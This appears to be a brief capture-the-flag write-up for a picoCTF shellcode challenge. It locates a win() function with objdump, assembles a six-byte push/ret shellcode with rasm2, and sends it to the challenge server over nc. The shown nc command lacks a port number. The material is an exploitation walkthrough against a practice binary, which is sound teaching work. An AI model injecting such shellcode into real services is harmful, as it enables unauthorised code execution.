This shellcode problem was similar to the last one, except we're only allowed to input 10 bytes.
However, the win() function has been uncommented. If we can figure out the address of the function,
we can generate our own shellcode to call that function and get the flag.

$ objdump -d shells | grep win
08048540 <win>:

Now we know the address of the function: 0x8048540, and we can use radare2 to generate shellcode.

$ rasm2 -C "push 0x08048540; ret"
"\x68\x40\x85\x04\x08\xc3"
$ echo "\x68\x40\x85\x04\x08\xc3" | nc shell2017.picoctf.com
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
